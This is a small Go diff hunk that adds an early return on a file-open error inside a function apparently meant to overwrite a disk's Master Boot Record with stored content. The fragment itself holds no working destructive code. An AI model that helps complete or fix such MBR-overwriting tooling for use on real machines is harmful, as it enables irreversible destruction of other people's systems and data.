@@ -129,6 +129,7 @@ func Overwrite() {
 		in, err := os.Open(target)
 		if err != nil {
 			notify.Error(err.Error(), "MBR.Overwrite_MBR()")
+			return
 		}
 		bytes := make([]byte, len(c_mbr.mbr_content))
 		for _, line := range c_mbr.mbr_content {
